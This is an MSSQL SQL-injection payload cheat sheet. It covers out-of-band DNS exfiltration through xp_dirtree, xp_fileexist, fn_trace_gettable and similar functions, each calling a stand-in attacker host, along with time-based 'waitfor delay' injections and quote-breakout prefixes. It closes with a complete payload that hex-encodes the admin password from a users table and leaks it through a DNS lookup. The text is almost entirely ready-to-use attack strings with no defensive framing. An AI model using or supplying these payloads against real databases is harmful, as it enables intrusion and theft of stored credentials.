| SQL Function | SQL Query |
| --- | --- |
| `master..xp_dirtree` | `DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.HACKERSDOMAIN.com\\x"');` |
| `master..xp_fileexist` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist "\\'+@T+'.HACKERSDOMAIN.com\\x"');` |
| `master..xp_subdirs` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs "\\'+@T+'.HACKERSDOMAIN.com\\x"');` |
| `sys.dm_os_file_exists` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.HACKERSDOMAIN.com\x');` |
| `fn_trace_gettable` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.HACKERSDOMAIN.com\x.trc',DEFAULT);` |
| `fn_get_audit_file` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.HACKERSDOMAIN.com\',DEFAULT,DEFAULT);` |

- OUT-OF-Band DNS Request
  
  - waitfor delay '00:00:10'
- username=admin'; waitfor delay '00:00:10' --+
  
- DECLARE @reza VARCHAR(1024);select @reza=(select 1234 );
  
- '; PAYLOAD --+
  
- "; PAYLOAD --+
  
- '); PAYLOAD --+
  
- "); PAYLOAD --+
  
- ; PAYLOAD --+
  

```sql
test';DECLARE @T VARCHAR(MAX);SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), password), 1) from users WHERE username='admin'; SELECT * FROM fn_trace_gettable('\\'%2bsubstring(@T,1,30)%2b'.'%2bsubstring(@T,31,60)%2b.test.com\x.trc',DEFAULT);--+- 
```
